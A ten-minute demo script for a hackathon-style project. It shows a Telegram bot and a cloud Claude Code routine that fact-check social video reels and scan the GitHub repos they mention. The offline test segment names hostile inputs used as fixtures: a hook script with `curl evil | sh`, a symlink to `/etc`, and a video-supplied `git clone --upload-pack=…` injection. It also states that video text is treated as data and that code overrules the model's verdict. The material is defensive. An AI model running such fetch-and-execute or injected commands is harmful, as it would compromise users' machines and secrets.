# Demo script: 10 minutes (cloud path)

Judging: this video is 50% of the grade and is technical. Show that every safety claim is computed by code and tested, not promised by a prompt.

**Every step is tagged. Verify the NOT YET LIVE ones before recording.**
- ✅ **RAN LIVE**: TikTok end to end through relay and routine (4 Nov). Instagram reel, 84 s long, 109 s total (5 Nov). Both on the *older* report format (one fact-check, one report).
- ⚠️ **NOT YET LIVE**: one report per find with its own Adopt/Skip; type rules (skill or mod gets Adopt, a full app gets read-only analysis); the "Saw: 4 of 30 frames" receipt; `/projects`, `/goals`, `/report owner/repo`.
- 🔧 **OPTIONAL**: Mac fallback for YouTube (T25). Only if it works on the day. **Do not use a YouTube link in the main demo**: cloud YouTube is blocked.
- 🧪 **OFFLINE**: runs on your laptop with no network (tests).

## Before you record
- [ ] **Pick the video in advance**: a TikTok or Instagram reel that names GitHub repos (ideally one skill/mod and one full app, to show both rules). **Run it once end to end beforehand** so you know it works and your Claude usage isn't used up (routine runs come out of your plan).
- [ ] Your own Telegram connection works on the recording network (send `/start`; the relay status page says Connected ✓). School Wi-Fi blocks Telegram, so record from a network where it works.
- [ ] **Nothing secret on screen**: no Deno Deploy environment page, no `~/.reelay/config.toml`, no routine settings with tokens, no terminal history with keys. Close those tabs.
- [ ] Set `/goals` and `/projects` once, so the fit line has something to match.
- [ ] **Record a backup take** of the whole live segment (minutes 2–6) and keep it.
- [ ] Have a terminal open in the repo with `.venv/bin/pytest` working. Run it once so it's cached.

## Timeline

| Min | Show | Say / point out | Tag |
|---|---|---|---|
| 0:00–0:45 | Title, one-line pitch | "I save tools from Reels and never check them. Trying a random repo on my laptop is risky. So Omnividens does it in the cloud and only recommends." | |
| 0:45–2:00 | **Architecture** (README Mermaid diagram) | Telegram → **relay** (Deno Deploy, only thing that talks to Telegram; checks my Telegram ID; strangers are dropped silently; rate-capped) → **routine** (Claude Code, a fresh disposable VM per video) → report back through the relay. The bot token stays in the relay; the routine only has a relay secret the cloud proxy injects. Why cloud: school Wi-Fi re-signs Telegram's TLS, and I chose not to weaken certificate checks. | |
| 2:00–3:00 | **Share the video** to the bot | Reply "Got it. Takes a few minutes." Show the relay accepted it (Telegram only; not the Deno page). Say: video text is data, never instructions. | ✅ |
| 3:00–4:15 | **While it runs**: show what the routine does (`routine/PROMPT.md`, hard rules first) | Download (yt-dlp), frames, transcript, web-searched fact-check, then repos cloned **for reading only**: nothing is installed or run. Don't invent timings: the Instagram run took 109 s in total for an 84 s video. | ✅ |
| 4:15–5:15 | **Fact-check message** | Summary in my vibe, claims with timestamps and **sources cited** (not "verified"). If using the new format: the receipt "Saw: N of 30 frames" says how many frames Claude really looked at. | ✅ (old format) / ⚠️ (receipt) |
| 5:15–6:15 | **One report per find** with Adopt / Skip | Each report: what it is, its type, "Is it safe?", fit for my `/projects`, and usage. Safety wording is **"found none of the patterns I check for"**, never "safe". Token numbers say **estimate**. Tap Adopt on a skill: "I have NOT installed anything", plus the exact `git clone --` line and the scanned commit. Show that a full app only gets a read-only analysis with no Adopt button. Mention `/report owner/repo` for repos that were left out. | ⚠️ |
| 6:15–8:15 | **The Adopt gate, offline** (no network needed) | Say: the Adopt button is decided by **code**, not by the model. The model can only *lower* a verdict. Run `.venv/bin/pytest -q tests/test_cloud.py -k "hooks or says_clean or script or lookalike"` and `.venv/bin/pytest -q tests/test_sandbox.py -k "symlink or hooks_in_frontmatter or high_verdict"`. Walk through three cases: (1) a repo whose plugin has a hook and `scripts/steal.sh` containing `curl evil \| sh` (`test_mod_with_hooks_is_never_yes_and_keeps_adopt_with_warning`): never says YES, shows a ⚠️ and the file paths to read first. (2) The model says "YES" but our scan says high (`test_model_says_clean_but_our_scan_says_high`): report says NO, "I recommend Skip", no clone line. (3) A symlink to `/etc` (`test_symlink_candidate_is_high_and_not_run`). Also: lookalike domains don't confirm identity (`test_lookalike_domains_do_not_confirm_identity`). Open `reelay/core/reports.py` at `apply_gate` to show where it's decided. | 🧪 (cloud tests live on branch `agent/t20-reports` until merged: run them from there if needed) |
| 8:15–9:15 | **Written peer reviews caught real holes** | Open `docs/reviews/`. Builder agents each owned one module in a git worktree; a different agent reviewed each. Read three real catches: the bot downloaded files from strangers *before* checking pairing; blanket `Read` rules would have let a skill read `~/.ssh`; a video-supplied URL could have become `git clone --upload-pack=…`. Show the repo's numbers from `git log` and the README table (re-count the day before). | |
| 9:15–9:45 | **Honest limits** | Scan-and-read only in the cloud, not a run; fact-check sources are cited by the model, not proof; TikTok/Instagram only, YouTube from cloud IPs is blocked; runs use my plan. | |
| 9:45–10:00 | Close, repo link | | |

**Optional extra (🔧 only if solid on the day):** if the Mac fallback (T25) works, spend 30 seconds sending a YouTube link and show the job queued on the relay, downloaded on the Mac, and the report arriving. If it hasn't been run end to end, skip it and don't mention it.

## Surprise moment (the 10%)
Show the **model being overruled**: in the offline segment, edit the test fixture live so the model says "YES" for a repo that has a `curl | sh` hook, run the test, and show the report refuses to say YES. One line to say: "the AI can't talk its way past the gate."

## Backup plan
| If this fails | Do this |
|---|---|
| Telegram blocked on the network | Switch to a network where it works; as a last resort play the backup take for minutes 2–6 and say so. |
| Routine run is slow or errors | Cut to the backup take. Never wait on camera. |
| Usage limit hit | Play the backup take; run the offline segment live. |
| New report format misbehaves | Show only what ran live (one fact-check, one report) and run the new behaviour through the tests instead. |
| `pytest` fails to start | Show the test file and the `apply_gate` code and read the assertions aloud. |
